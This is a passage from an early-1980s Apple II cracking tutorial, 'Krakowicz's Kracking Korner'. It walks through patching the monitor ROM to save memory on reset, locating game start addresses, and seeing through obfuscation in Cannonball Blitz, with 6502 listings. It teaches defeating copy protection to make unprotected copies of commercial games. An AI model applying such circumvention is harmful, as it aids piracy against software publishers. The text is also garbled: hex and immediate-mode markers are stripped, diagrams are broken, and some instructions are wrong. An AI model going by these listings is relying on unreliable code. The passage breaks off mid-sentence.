YOUR SCHOOL SAYS THAT THE TOP LINE  FALLS INTO THE BIT BUCKET , BUT YOU KNOW HOW EVERYONE FEELS ABOUT HIM.     AS MOST SOFTWARE PROTECTORS KNOW, THIS WILL KEEP MOST OF THE AMATEURS OUT OF THE PROGRAM, AND YOU'LL SEE EVIDENCE OF THIS TECHNIQUE IN THE FORM OF A LOT OF  GARBAGE  ON THE TEXT SCREEN WHEN YOU RESET OUT OF A PROTECTED GAME.  OUR JOB, THEN, IS TO KEEP THESE ZERO PAGE AND SCREEN MEMORY LOCATIONS FROM BEING LOST, SINCE MOST PROTECTION SCHEMES USE THESE AREAS IN SOME WAY OR OTHER  BR0DERBUND, FOR EXAMPLE, HAS RECENTLY BEEN STORING THE ADDRESS MARKER FOR THE DISK TRACK IN LOCATIONS 20, 21, AND 22 .    THE SAFE WAY TO PREVENT INFORMATION FROM BEING LOST FROM THESE  VOLATILE  LOCATIONS IS TO TRANSFER ALL OF THE CONTENTS TO A SAFE AREA    LOCATIONS 2000   UP  OR 4000   UP  WHERE A HI RES PICTURE NORMALLY RESIDES.  IN FACT, IT WOULD BE BEST TO SAVE EVERYTHING FROM 0 TO 8FF, SINCE BOOTING A DISKETTE TO SAVE THE DATA ALSO DESTROYS LOCATIONS 800 8FF.   REMEMBER THE FIRST LAW OF DISK KRACKING   TRACK 0, SECTOR 0 ALWAYS STARTS WITH D5 AA 96 AND ALWAYS LOADS INTO 800 8FF . BECAUSE THIS IS THE BEGINNING CLASS, LET'S LOOK AT TWO EXAMPLES OF SHORT BINARY SUBROUTINES THAT WILL DO THE  SAVE  FOR US.  BOTH START, AS WILL BE EXPLAINED LATER, AT LOCATION FECD IN THE F8 ROM. THE FIRST IS THE MOST STRAIGHTFORWARD AND EASIST TO FOLLOW      LDY    00     CLEAR Y REGISTER   LDA   00,Y    GET A BYTE FROM 0 Y   STA   2000,Y  STORE AT 2000 Y   LDA   0100,Y  THEN FROM 100 Y   STA   2100,Y  TO 2100 Y   LDA   0200,Y  AND SO ON UNTIL   STA   2200,Y  WE HAVE COVERED   LDA   0300,Y  ALL THE MEMORY   STA   2300,Y  'PAGES' FROM 0 TO 8   LDA   0400,Y  AND STORED INTO   STA   2400,Y  PAGES 20 TO 28   LDA   0500,Y   STA   2500,Y   LDA   0600,Y   LDA   2600,Y   LDA   0700,Y   STA   2700,Y   LDA   0800,Y   STA   2800,Y   INY         THEN ADD 1 TO Y REG   BNE   FED0    AND REPEAT IF   256   JMP   FF59    WHEN WE'RE ALL DONE          JUMP TO MONITOR START    THIS 61 BYTE ROUTINE, IF IT COULD BE EXECUTED AUTOMATICALLY WHEN THE RESET KEY IS PRESSED, WOULD SAFELY STASH ALL OF THE CHANGEABLE MEMORY AND EXIT GRACEFULLY INTO THE MONITOR.    A MORE COMPACT AND GENERAL, BUT LESS OBVIOUS ROUTINE IS SHOWN BELOW. IT IS INCLUDED BECAUSE IT IS TYPICAL OF THE  MEMORY MOVE PROGRAMS  THAT WE WILL EVENTUALLY HAVE TO WRITE IN KRACKING ALMOST ANY PROGRAM.    LDY    00     CLEAR Y REGISTER   LDA   00,Y    XFER THE ZERO PAGE TO   STA   2000,Y  2000 20FF SO WE CAN USE   INY         THE ZERO PAGE MEMORY   BNE   FED0    FOR THE OTHER MOVES   LDA    00     SET UP LOCNS 0   1 AS A   STA   00      2 BYTE POINTER FOR THE   STA   02      SOURCE ADDRESS, USE 2 3   LDA    01     AS 2 BYTE POINTER FOR   STA   01      THE DESTINATION ADDRESS   LDA    21     STARTING AT  2100   STA   03   LDA    00     GET A BYTE FROM 100 UP   STA    02     STORE AT 2100 UP   INC   02      INCREMENT LO ORDER BYTE   INC   00      OF SOURCE   DESTINATION   BNE            BACK TO LDA   00  IF          LO ORDER IS  256   INC   03      IF LO ORDER 0, INC THE   INC   01      HI BYTE OF EACH   LDA   01      CHECK TO SEE IF HI BYTE   CMP    09     IS 9  WE'RE THRU AT 8FF   BNE           IF NOT, LOOP BACK TO          THE LOAD STORE UNTIL          WE'RE ALL DONE   JMP   FF59    EXIT THRU MONITOR    UNLIKE THE FIRST ROUTINE, THIS ONE  AT 47 BYTES  USES RAM LOCATIONS 0 THROUGH 3, SO THE ZERO PAGE MUST BE TRANSFERRED BEFORE IT IS ALTERED BY USING THOSE ADDRESSES AS POINTERS. WHILE THE FIRST ROUTINE MUST GROW BY SIX BYTES FOR EACH ADDITIONAL PAGE TRANSFERRED, THE SECOND NEEDS ONLY TO HAVE THE  9  IN THE COMPARE STATEMENT CHANGED TO THE APPROPRIATE VALUE ONE HIGHER THAN THE LAST PAGE NUMBER BEING TRANSFERRED.    TO RETURN TO THE BUSINESS OF ALTERING ROMS, IT IS EASY TO SEE THAT AN AUTOSTART ROM COULD BE MADE TO BEHAVE LIKE AN OLD ROM JUST BY CHANGING LOCATIONS FFFC D TO 59 FF FROM 62 FA.   A NOTE TO THE FAINT HEARTED  YOU CAN BUY AN OLD MONITOR F8 ROM FOR ABOUT  10 AND PLUG IT DIRECTLY INTO YOU APPLE'S F8 SOCKET, BUT YOU WON'T HAVE ALL THE BENEFITS WE'VE BEEN TALKING ABOUT .  AS LONG AS WE'RE GOING TO THE EFFORT OF MAKING A CHANGE, THOUGH, WE MIGHT AS WELL ADD ONE OF THE ROUTINES ABOVE AND ALLOW THE NEW ROM TO SAVE THE VOLATILE MEMORY FOR US.  TO DO THIS, WE'LL HAVE TO GIVE UP SOMETHING IN THE ROM, AND THE MOST EASILY SURRENDERED AREA FOR MOST OF US IS THE TAPE READ SAVE ROUTINES AT  FECD.  IF WE THEN CHANGED FFFC D TO CD FE, THE MEMORY FROM 0 TO 8FF WOULD BE SAVED TO 2000 28FF EVERY TIME THE 'RESET' KEY WAS PRESSED.  SINCE IT'S SOMETIMES INCONVENIENT TO HAVE THAT HAPPEN WHEN THE RESET KEY IS PRESSED, WE CAN REQUIRE THAT A SPECIFIC KEY BE ALSO PRESSED TO MAKE IT OCCUR.  THESE FEW INSTRUCTIONS INSERTED BEFORE EITHER OF THE ROUTINES ABOVE WILL GIVE A  RESET AND SAVE  WHEN THE     KEY IS HELD DOWN  OR WAS THE LAST KEY PRESSED , WHILE GIVING A REGULAR  OLD RESET  THE REST OF THE TIME.    LDA   C000   LOOK AT THE KEYBOARD   ROL        MASK OFF HIGH BIT   CMP    5A    WAS IT       2D X 2  5A    BNE          IF NOT, BRANCH TO THE      !  LOCATION WITH THE      !   JUMP FF59  INSTRUCTION      !  AT THE END OF THE SAVE      !  SUBROUTINE.     OK, OK   WE ALL AGREE THAT THESE WOULD BE NEAT THINGS TO HAVE IN THE F8 ROM, SO HOW DO WE GET IT THERE   FIRST, GET HOLD OF A PROMBURNER  PROMBLASTER, EPROM PROGRAMMER, ETC.  THAT WILL PROGRAM 2716 EPROMS.  EACH ONE IS DIFFERENT, SO I WON'T TRY TO GIVE DETAILED INSTRUCTIONS ON THE ACTUAL PROGRAMMING.  BUY OR BORROW A FRIEND'S OLD F8 ROM  OR GET THE BINARY FILE  THEN TYPE IN OR LOAD IN THE CHANGES YOU WANT TO MAKE AT FECD   UP AND AT FFFC D, AND PROGRAM A 2716 EPROM WITH OUR MODIFIED VERSION OF APPLE'S F8 MONITOR ROM.    ALL THAT REMAINS TO TAKE FULL ADVANTAGE OF THE NEW F8 ROM IS TO MAKE A SLIGHTLY MODIFIED SOCKET AND PLUG IT IN.  BOTH THE 2716 AND THE ORIGINAL 9316 ROM USED BY APPLE ARE READ ONLY MEMORY DEVICES HOLDING 2K BY 8 BITS OF INFORMATION   16K  ROMS , BUT THE PINOUT, OR ASSIGNMENT OF CHIP FUNCTIONS TO PIN NUMBERS IS SLIGHTLY DIFFERENT. TO USE THE 2716 IN A BOARD DESIGNED FOR A 9316, YOU NEED TO TIE PIN 21 TO 5 VOLTS  PIN 24  AND TIE PIN 18 TO GROUND  PIN 12 . YOU COULD MODIFY THE PROM ITSELF, BUT YOU'RE LIABLE TO RUIN THE CHIP, AND IT CREATES A REAL MAGILLA IF YOU NEED TO REPROGRAM IT.   A ROM CARD, SUCH AS AN INTEGER CARD, CAN BE USED FOR 2716'S IF TWO JUMPERS ARE CONNECTED AT THE TOP OF THE CARD, AND   ONLY   2716'S ARE USED IN ALL OF ITS SOCKETS AFTER THAT .    GET A 24 PIN, PREFERABLY LOW PROFILE IC SOCKET, AND ORIENT IT WITH THE PINS UP AND THE NOTCH INDICATING THE 'PIN ONE' END TO THE RIGHT.  IT SHOULD LOOK LIKE                                           !  13 14 15 16 17 18 19 20 21 22 23 24! ! .  .  .  .  .  .  .  .  .  .  .  .  ! !          ! !          ! !           !       NOTCH   ! !           !          ! ! .  . .  .  .  .  .  .  .  . .  .  ! !                                    ! !12 11 10 9  8 7  6  5  4  3  2  1   !                                            USING A LOW WATTAGE SOLDERING IRON, SOLDER A SHORT PIECE OF 26 30 GAUGE WIRE BETWEEN PINS 21 AND 24, AND ANOTHER ONE BETWEEN PINS 12 AND 18.  MAKE THE CONNECTION AS CLOSE TO THE SOCKET AS POSSIBLE, AND TRY TO AVOID GETTING ANY SOLDER ON THE ENDS OF PINS 12 AND 24.  CUT OFF PINS 21 AND 18, AGAIN AS CLOSE AS POSSIBLE TO THE SOCKET.   PLUGGING ANOTHER SOCKET INTO THE ONE BEING MODIFIED WILL HELP TO PREVENT DISTORTION DURING THE SURGERY .  THE SOCKET NOW LOOKS LIKE                                           !  13 14 15 16 17 18 19 20 21 22 23 24! ! .  .  .  .  .     .  .     .  .  .  ! !    X    X       ! !               ! !                   !                     ! !               !             ! !    . .  .  .  .  .  .  .  . .  .  ! !                                    ! !12 11 10 9  8 7  6  5  4  3  2  1   !                                                  X NO PIN    DOUBLE CHECK THE CONNECTIONS ON THE BOTTOM OF THE SOCKET, AND PLUG THE 2716 INTO THE SOCKET, BEING CAREFUL TO MATCH THE NOTCHED END OF THE CHIP TO THE SOCKET.  MAKE SURE THAT THE POWER TO THE APPLE IS TURNED OFF, AND PLUG THE ASSEMBLY INTO THE F8 SOCKET ON THE MOTHER BOARD WITH THE NOTCH TOWARD THE FRONT  KEYBOARD  END OF THE APPLE.  CROSS YOUR FINGERS AND TURN ON THE APPLE.  IF THERE IS NO FAMILIAR  BEEP , OR IF THE TV SCREEN STAYS WHITE, OR IF THE SYSTEM DOESN'T RESPOND TO THE RESET KEY, TURN OFF THE POWER AND EXAMINE THE CHIP AND SOCKET CAREFULLY TO FIND THE ERROR.  IF BLACK CLOUDS OF SMOKE ROLL OUT FROM THE APPLE, FORGET WHERE YOU READ THIS.  ACTUALLY, THE MOST COMMON MISTAKE OF INSERTING THE CHIP BACKWARDS IS SELDOM HARMFUL TO IT, BUT DOES LOCK UP THE APPLE'S BUS.  REMEMBER THAT BOTH THE 2716 AND THE 9316 THAT YOU REMOVED CAN BE DAMAGED BY STATIC ELECTRICITY, SO HANDLE WITH CARE AND DON'T SCUFF YOUR FEET ON THE CAT.                                                                                                      KRAKOWICZ'S KRACKING KORNER                           THE BASICS OF KRACKING II                           SINGLE LOAD GAMES, STARTING             LOCATIONS, AND OBFUSCATION.                                                                THE FIRST IN THIS SERIES WAS STRAIGHTFORWARD, SINCE THE HARDWARE RESET IS A NECESSITY TO BEGIN KRACKING.  AFTER THAT, THE PATH DIVIDES, AND THERE ARE MANY MANY WAYS TO PRODUCING AN UNPROTECTED VERSION OF A PROGRAM.  THE PATH YOU FOLLOW IS GOVERNED BY THREE THINGS   THE KIND OF PROGRAM, THE TYPE OF PROTECTION EMPLOYED, AND YOUR OWN PERSONAL STYLE  STYLE, BY THE WAY, IS PRIMARILY THE RESULT OF LIMITATIONS. TRY TO KEEP AN OPEN MIND AND DEVELOP AS MUCH VERSATILITY AS POSSIBLE .  THE EASIEST KIND OF PROGRAM TO DEAL WITH IS THE ONE THAT IS SEEN LESS FREQUENTLY EVERY MONTH   THE  SINGLE LOAD  PROGRAM OR GAME.  THESE ARE PROGRAMS WHICH ARE LOADED IN FROM DISK ONLY ONCE, AND THEN ARE RUN STRICTLY FROM MEMORY WITH NO DISK ACCESS.  IN THE GOOD OLD DAYS, ALMOST EVERY GAME WAS LIKE THIS, AND REMOVING PROTECTION WAS NOT THAT DIFFICULT.  ON THE OTHER HAND, WHEN YOU READ SOMETHING LIKE OLAF LUBECK'S CHALLENGE IN TRACK 17, SECTOR D OF CANNONBALL BLITZ    YOU'LL NEVER CRACK IT , THERE'S MORE SATISFACTION WHEN YOU GET TO SAY  OH, YES I DID! .    IN ORDER TO BECOME PROFICIENT AT THIS AND THE TECHNIQUES TO BE DISCUSSED IN FUTURE EPISODES, YOU WILL HAVE TO GET USED TO COMMITTING A VERY UNNATURAL ACT  INTERPRETING ASSEMBLER CODE WITH NO COMMENTS OR INSTRUCTIONS TO GUIDE YOU.  THE DISASSEMBLER  MONITOR 'L' COMMAND  IS A GREAT HELP IN THIS WORK, SINCE IT TRANSLATES MACHINE CODE INTO ASSEMBLER MNENONICS, BUT THE REAL BURDEN FALLS ON THE INGENUITY OF THE KRACKIST. THERE IS NO SUBSTITUTE FOR EXPERIENCE, AND NO ONE CAN TEACH YOU HOW TO DO IT BEYOND POINTING OUT SOME OF THE TECHNIQUES WE USE, AND WARNING YOU ABOUT SOME OF THE TRICKS USED TO KEEP YOU FROM SUCCEEDING.    THE PHILOSOPHY OF ATTACK WITH THESE GAMES IS TO FIND THE STARTING LOCATION  THE ADDRESS WHICH WILL ALWAYS RESTART THE GAME, AND THEN TO SAVE THE GAME  PROGRAM  AS A NORMAL DOS 3.3 BINARY FILE.  AS A SIMPLE EXAMPLE OF A STARTING LOCATION, YOU PROBABLY ALREADY KNOW THAT WHEN YOU MESS UP WITH APPLE'S  FID  PROGRAM, YOU CAN RESTART BY TYPING '803G' FROM THE MONITOR.  AT ONE TIME, BEFORE THE PUBLISHERS GOT SMART, A STARTING LOCATION WAS LIKELY TO BE A COMMON, EVEN NUMBER LIKE  800, C00, 4000, OR 6000, AND IT'S STILL WORTH CHECKING THESE 'OLD FAVORITES' IN CASE YOU FIND A NAIVE OR LAZY AUTHOR.  IF THESE FAIL, WE WILL HAVE TO BEGIN THE PROCESS OF MEMORY SNOOPING.  THIS IS THE INTRODUCTION TO THE UNGLAMOROUS ACTIVITY THAT OCCUPIES MOST OF THE TIME OF THE DEDICATED KRACKIST. AS ALWAYS, INSPECTOR AND WATSON IN ROM ARE HIGHLY RECOMMENDED, SINCE THEY MAKE THE PROCESS INFINITELY EASIER. WHAT WE ARE TRYING TO DO IS DIRECTLY LOCATE THE BEGINNING ADDRESS OF THE PROGRAM, OR TO SEARCH BACK TO IT FROM SOMETHING WE CAN RECOGNIZE.    SINCE MANY GAMES BEGIN BY DISPLAYING A HI RES  BANNER  OR GAME SCREEN, A GOOD PLACE TO START LOOKING IS THE SERIES OF INSTRUCTIONS THAT SET UP THE HI RES SCREEN  THERE IS A DISCUSSION OF THIS IN THE DOC FOR MASTERKEY PLUS, BUT THEY MAKE A FEW TOO MANY ASSUMPTIONS .  APPLE'S SCREEN DISPLAY, AS YOU PROBABLY KNOW, IS SET UP BY ACCESSING SOME  SOFT SWITCHES .  IN HEX, THESE ARE LOCATIONS  C050 TO C057  SORRY, BUT IF YOU'RE GOING TO LEARN THE GENTLE ART OF KRACKING, YOU'LL HAVE TO BECOME FLUENT IN HEXADECIMAL  WE WON'T PULL ANY PUNCHES WHEN IT COMES TO NUMBER SYSTEMS .  IT DOESN'T MATTER WHAT YOU DO TO THESE LOCATIONS, AS LONG AS YOU MAKE A REFERENCE, SO THE FOLLOWING INSTRUCTIONS ALL ESTABLISH GRAPHICS MODE       LDA  C050, BIT  C050,   ROL  C050    STA  C050, CMP  C050,   EOR  C050    ALSO, THIS ONE  LDY   71  AND  BFAF,Y     MANY AUTHORS HAVE ESTABLISHED THE HABIT, HOWEVER, OF WRITING THE SEQUENCE     LDA  C054    SELECT PRIMARY PAGE     LDA  C057    SELECT HI RES GRAPHICS     LDA  C050    SELECT GRAPHICS MODE   AND SOMETIMES,     LDA  C052    PURE GRAPHICS SCREEN .    TO FIND THESE INSTRUCTIONS, USE THE INSPECTOR'S 'FIND' FUNCTION, AND PROGRAM IT TO SEARCH FOR THE TWO BYTE SEQUENCES OF '50 C0' AND '57 C0'.  GENERALLY, AS LONG AS THE WRITERS AREN'T DELIBERATELY TRYING TO CONFUSE YOU, YOU WILL FIND ONE TO SEVERAL LOCATIONS WHERE THESE SEQUENCES ARE CLOSE TO EACH OTHER.  YOU WILL ALSO FIND SOME ADDRESSES THAT DON'T REALLY CONTAIN A SCREEN REFERENCE, SINCE THE SEARCH IS ONLY FOR TWO BYTES  FOR YOU TRIVIA  STATISTICS BUFFS OUT THERE, A GIVEN TWO BYTE SEQUENCE WOULD OCCUR LESS THAT ONCE IN THE ENTIRE RAM MEMORY SPACE FROM 0 TO  BFFF IF THE DISTRIBUTION WERE TRULY RANDOM.  IT'S NOT. .    TO SEE IF EACH OCCURANCE OF THE PATTERN IS THE STARTING LOCATION, LOOK BACKWARDS UNTIL YOU FIND AN ABSOLUTE END FOR THE PREVIOUS SUBROUTINE SUCH AS 'RTS' OR 'JMP'.  YOUR SUBROUTINE SHOULD BEGIN IMMEDIATELY AFTER THAT, AND YOU SHOULD ASSUME FOR THE MOMENT THAT IT'S THE STARTING LOCATION.  IF, FOR EXAMPLE, THE LOCATION YOU FOUND IS  4123, TEST IT BY RELOADING THE GAME, RESETTING IT, AND TYPING '4123G'.  IF IT RUNS, SIT BACK AND GLOAT, OTHERWISE READ ON  IT SOUNDS UNNECESSARY TO RELOAD, BUT THE INSPECTOR USES A FEW LOCATIONS IN PAGES 0, 2, AND 3, SO IT'S BEST TO BE SAFE .  IF MURPHY'S LAW OF DYNAMIC NEGATIVES IS WITH YOU AND THE GAME DIDN'T START, IT'S USUALLY BECAUSE YOU HAVEN'T FOUND THE TRUE STARTING LOCATION.  YOU THEN NEED TO TRACE BACK FURTHER IN THE PROGRAM SEQUENCE TO FIND THE REAL START.    THERE ARE THREE WAYS FOR ANOTHER ROUTINE TO GET TO THE ONE YOU'RE LOOKING AT  JMP, JSR, AND THE FAMILY OF BRANCH INSTRUCTIONS.  TO ELIMINATE THE THIRD POSSIBILITY, KEEP IN MIND THAT BRANCHES CAN REACH UP TO  7F  127  LOCATIONS AWAY FROM EITHER DIRECTION. THIS IS EQUAL TO ABOUT 60 INSTRUCTIONS, SO YOU SHOULD REVIEW ABOUT ONE FULL PAGE OF DISASSEMBLY PRINTOUT  THREE SCREENSFUL  BEFORE AND RARELY AFTER WHAT LOOKED LIKE A POSSIBLE START.  IF YOU FIND A 'BNE 4123', OR 'BCC 4123', ETC., YOU WILL HAVE TO TRACK BACK TO THE BEGINNING OF THAT ROUTINE AND TRY AGAIN. REPEAT THIS PROCESS UNTIL YOU FIND A LOCATION THAT CAN ONLY BE REACHED BY A JMP OR JSR.    TO FIND OUT HOW THE PROGRAM GOT TO THIS LOCATION, DO A 3 BYTE SEARCH WITH THE INSPECTOR FOR A JSR  4123   20 23 41.  IF NOTHING SHOWS UP, TRY THE JMP  4123  4C 23 41.  ONE OF THESE MUST PRODUCE A REFERENCE, OR YOU MESSED UP THE EARLIER CHECK FOR BRANCHES.  ONCE YOU FIND THE EARLIER REFERENCE, GO THROUGH THE SAME PROCEDURE TO FIND THE START OF THIS ROUTINE, AND TRY IT OUT AS A STARTING LOCATION FOR THE GAME. IF IT DOESN'T WORK, TRY ONE MORE STEP FURTHER BACK  KRAKOWICZ'S FOURTH LAW OF KRACKING SAYS THAT IF YOU HAVE TO GO BACK MORE THAN TWO STEPS, YOU'RE PROBABLY NOT ON THE RIGHT TRAIL .    A NUMBER OF GAMES STILL DO US THE FAVOR OF PUTTING UP A SCREEN, PERHAPS PLAYING A LITTLE MUSIC, AND THEN WAITING FOR THE SPACE BAR OR OTHER KEY TO BE PRESSED.  IF IT'S NOT POSSIBLE TO FIND THE SCREEN SETUP, WE STILL HAVE A FAIRLY OBVIOUS  HOOK  INTO FINDING THE STARTING ADDRESS, AND IN MANY CASES THE GAME CAN BE SAVED 'AS IS' BY USING THE KEYBOARD ROUTINE AS THE STARTING ADDRESS.  DON'T WORRY FOR NOW ABOUT EXACTLY HOW WE WILL  SAVE THE GAME .  WE'LL GO THROUGH THAT CAREFULLY AND THOROUGHLY IN THE NEXT EPISODE.    SINCE THE KEYBOARD ADDRESS IS C000, WE CAN USUALLY LOCATE ALL THE INPUTS BY SEARCHING FOR THE 3 BYTE SEQUENCE OF 'AD 00 C0' WITH THE INSPECTOR. OCCASIONALLY, THE X OR Y REGISTER IS USED TO LOAD KEYBOARD DATA, SO THE SEQUENCES AC 00 C0 AND AE 00 C0 SHOULD BE TRIED IF THE FIRST COMES UP BLANK  ONLY THE REAL BASTARDS LIKE SIRIUS USE LDY   67  LDA  BF99,Y FOR THE KEYBOARD INPUT .  ALSO, KEEP IN MIND THAT ALL THE ADDRESSES FROM C000 TO C00F WILL ACCESS THE KEYBOARD, AND IF SOMEONE WAS REALLY DETERMINED TO CONFUSE YOU THEY COULD USE C007 ONE TIME, C00D THE NEXT, AND SO ON.  IF YOU KNOW THAT THE GAME USES THE KEYBOARD AND THE PRELIMINARY SEARCHES DON'T SHOW HOW, KEEP ON LOOKING FOR THESE ADDRESSES, OR THE SIRIUS TYPE COMPUTED ADDRESSES.  IT PROBABLY MEANS THEY HAVE SOMETHING TO KIDE, AND LOCATING THE KEYBOARD READ WILL REVEAL ENOUGH TO MAKE THE SEARCH WORTHWHILE.    IF THE PROGRAM IS WAITING FOR THE SPACE BAR, YOU WILL USUALLY FIND A SEQUENCE LIKE       78E0  LDA  C000    READ THE KEYBORARD  BPL  78E0    NO KEY PRESSED  STA  C010    RESET KBD STROBE         CMP   A0     WAS IT SPACE          BNE  78E0    NOPE, KEEP TRYING  JMP  6012    YES, GO TO START     THESE TWO LINES ARE ELIMINATED IF PRESSING ANY KEY WILL START THE GAME.    TO CHECK OUT 6012 AS A STARTING ADDRESS, SET UP TO VIEW THE HI RES SCREEN  OTHERWISE THE GAME MIGHT BE RUNNING WHILE YOU WATCH A BLANK TEXT SCREEN  WITH  C050  CR  C057  CR , THEN TYPE 6012G.  AS BEFORE, YOU WILL KNOW AT ONCE IF YOU WERE SUCCESSFUL.    ANOTHER WAY TO FIND A RESTART POINT IS TO SEARCH THROUGH THE KEYBOARD INPUT ROUTINES FOR A RESTART KEY.  IT HAS BECOME CONVENTIONAL TO USE CTRL R AS THE RESTART COMMAND  OCCASIONALLY CTRL S OR CTRL B , AND THIS IS EVEN EASIER TO TRACE. IN ONE OF THE ROUTINES FOLLOWING A C000 REFERENCE, YOU WILL FIND A CMP   92  SEE THE REFERENCE MANUAL, P.  7 FOR THE HEX VALUES OF THE KEYBOARD .  THE LOCATION BRANCHED TO OR JUMPED TO BY A SUCCESSFUL COMPARE WILL BE THE RESTART FOR THE GAME.  AGAIN, YOU CAN SAVE THE GAME AS IS AND USE YOUR NEW FOUND STARTING LOCATION.     IF THESE RELATIVELY SIMPLE APPROACHES FAIL, YOU'LL HAVE TO RESORT TO THE REAL GRUNT TYPE OF DETECTIVE WORK  LOOKING FOR SOMETHING PROMISING  WE'LL DISCUSS BOOT TRACING AS AN ALTERNATIVE WAY OF GETTING TO THIS POINT IN ANOTHER EPISODE DEVOTED ENTIRELY TO THAT TECHNIQUE .  LIKELY THINGS TO LOOK FOR ARE  SETUPS , WHERE A LOT OF ZERO PAGE LOCATIONS ARE INITIALIZED TO BEGIN THE GAME       LDA   00     STA  23     STA  57     LDA   12     STA  30     LDA   E9     STA  72     ETC.

JSR  8CD  JSR  CE4  JSR  2020  JSR  203D  JSR  8FE  ETC.

UNFORTUNATELY, SNOOPING FOR THESE IS A TIME CONSUMING, HIT AND MISS OPERATION   THE REAL STARTING ADDRESS CAN BE ANYWHERE FROM 0000 TO BFFF  OR EVEN VIA A BASIC SUBROUTINE IN D000 F7FF, BUT I DON'T WANT TO DISCOURAGE YOU YET .    WHILE IT WILL BE DISCONCERTING TO THE BEGINNER, AS YOU GET MORE EXPERIENCE YOU BEGIN TO ENJOY DEFEATING VARIOUS DELIBERATE ATTEMPTS TO THROW YOU OFF THE TRAIL  THE GENERAL SUBJECT OF OBFUSCATION, OR INTENTIONAL LACK OF CLARITY. BECAUSE THE MAJOR SOFTWARE COMPANIES KNOW WE'RE OUT HERE WAITING FOR THEIR LATEST OUTPUT, THEY OFTEN TRY TO MISDIRECT US OR FIND INNOVATIVE WAYS OF HIDING SENSITIVE PORTIONS OF THE PROGRAM WITH A VARIETY OF TECHNIQUES.  TAKE A LOOK AT THE FOLLOWING PIECE OF CODE FROM ON LINE'S CANNONBALL BLITZ   59E4  CE E7 59    DEC    59E7 59E7  CF         59E8  EA     NOP 59E9  59 EF EA    EOR    EAEF,Y 59EC  59 AD 51    EOR    51AD,Y 59EF  C0 AD     CPY     AD 59F1  54         59F2  C0 AD     CPY     AD 59F4  57         59F5  C0 AD     CPY     AD 59F7  52         59F8  C0 20     CPY     20 59FA  60     RTS 59FB  5B         59FC  20 C5 5B    JSR    5BC5 59FF  20 4E 5B    JSR    5B4E    THIS IS AN EXAMPLE OF  SELF MODIFYING CODE  INSTRUCTIONS THAT CHANGE AS THE PROGRAM IS RUN.  IT'S DANGEROUS AND GENERALLY POOR PROGRAMMING PRACTICE, BUT IT CAN BE USED TO THROW THE DOGS OFF THE SCENT.  AT FIRST GLANCE, IT LOOKS LIKE DATA OR GARBAGE STUCK IN BEFORE SOME REAL CODE.  LET'S LOOK AT EXACTLY HOW IT WORKS. EXECUTING THE FIRST INSTRUCTION CHANGES THE SECOND INSTRUCTION FROM JUNK INTO A LEGAL INSTRUCTION    59E4  CE E7 59    DEC    59E7 59E7  CE EA 59    DEC    59EA 59EA  EF         59EB  EA     NOP 59EC  59 AD 51    EOR    51AD,Y 59EF  C0 AD     CPY     AD      IF YOU HAVE AN OLD MONITOR ROM, YOU CAN TYPE 59E4S TO EXECUTE THE FIRST INSTRUCTION .

THIS POINTS OUT THE VALUE OF SEARCHING WITH THE INSPECTOR, SINCE EVEN THE CLOSEST SCRUTINY WOULD PROBABLY NOT HAVE MADE YOU SUSPECT WHAT WAS ACTUALLY HERE. NOTICE, TOO, THAT THE THIRD INSTRUCTION INCREMENTS 59EA, SO ONCE IT'S BEEN RUN, IT'S OBSCURED AGAIN.    ANOTHER STANDARD TRICK, ALSO SHOWN IN THIS EXAMPLE, IS CALLED  FALSE DISASSEMBLY , AND IS DEAR TO EDU WARE, ON LINE, IDSI, AND SCIENTIFIC RESEARCH ASSOCIATES.  HERE, EXTRA BYTES ARE ADDED FOR THE SOLE PURPOSE OF GIVING A FALSE INDICATION OF PROGRAM FLOW  THE FAKE BYTES ARE THEN BRANCHED AROUND.  LOOK CLOSELY AT THE INSTRUCTION IN 5A1B IT SAYS BPL 5A1E.  THE NEXT INSTRUCTIONS IN SEQUENCE APPEAR TO THE CASUAL EYE TO BE LDA   20  STA   5A ,Y. ACTUALLY, THE NEXT INSTRUCTION IS JSR  5A91. THIS IS CRUCIAL, SINCE THIS SUBROUTINE LOADS IN THE GAME AND DOES A NIBBLE COUNT.  TO SEE A WHOLE BUNCH OF FALSE DISASSEMBLIES IN A ROW, LOOK AT THE CODE IN THE ACTUAL SUBROUTINE   5A91  A9 00     LDA     00 5A93  10 01     BPL    5A96 5A95  20 A8 59    JSR    59A8 5A98  00     BRK 5A99  27         5A9A  C8     INY 5A9B  D0 FA     BNE    5A97 5A9D  85 10     STA    10 5A9F  F0 01     BEQ    5AA2 5AA1  A9 A9     LDA     A9 5AA3  20 59 00    JSR    0059 5AA6  27         5AA7  C8     INY 5AA8  C8     INY 5AA9  D0 F9     BNE    5AA4 5AAB  85 11     STA    11 5AAD  49 B7     EOR     B7 5AAF  48     PHA 5AB0  A5 10     LDA    10 5AB2  49 11     EOR     11 5AB4  48     PHA 5AB5  D0 01     BNE    5AB8 5AB7  4C 60 08    JMP    0860 5ABA  60     RTS    I STRONGLY URGE YOU TO SIT DOWN AND FIGURE OUT EXACTLY WHAT THE REAL PROGRAM IS HERE, AND IF POSSIBLE, WHAT IT DOES.  COVER UP THE EXPLANATION BELOW, AND GO THROUGH THE CODE BYTE BY BYTE TO ELIMINATE THE FAKE BYTES.  IT'S NOT JUST CHARACTER BUILDING  IF YOU GO THROUGH A FEW OF THESE, YOU'LL LEARN TO RECOGNIZE THEM WHEN THEY POP UP.    THOSE OF YOU WHO REALLY WENT THROUGH IT, GIVE YOURSELVES FOUR KRACKING HONOR POINTS.  FOR THE REST OF YOU, HERE'S A LISTING OF THE FUNCTIONAL EQUIVALENT  SOME ADDRESSES ARE CHANGED BECAUSE THE JUNK BYTES HAVE BEEN TAKEN OUT    5A91  A9 00     LDA     00 5A93  A8     TAY 5A94  59 00 27    EOR    2700,Y 5A97  C8     INY 5A98  D0 FA     BNE    5A94 5A9A  85 10     STA    10 5A9C  A9 20     LDA     20 5A9E  59 00 27    EOR    2700,Y 5AA1  C8     INY 5AA2  C8     INY 5AA3  D0 F9     BNE    5A9E 5AA5  85 11     STA    11 5AA7  45 B7     EOR    B7 5AA9  48     PHA 5AAA  A5 10     LDA    10 5AAC  49 11     EOR     11 5AAE  48     PHA 5AAF  60     RTS    THIS IS ALSO VALUABLE BECAUSE IT INTRODUCES THE CONCEPT OF  JUMPING THROUGH THE STACK .  THE RTS INSTRUCTION TRANSFERS THE TWO BYTES ABOVE THE STACK POINTER IN PAGE ONE TO THE PROGRAM COUNTER, INCREMENTS THE LOW BYTE BY ONE, AND JUMPS TO THAT LOCATION. ORDINARILY, THE BYTES ON THE STACK WERE PLACED THERE AS A RETURN ADDRESS BY THE JSR INSTRUCTION.  IN THIS CASE, IN VERY ROUNDABOUT 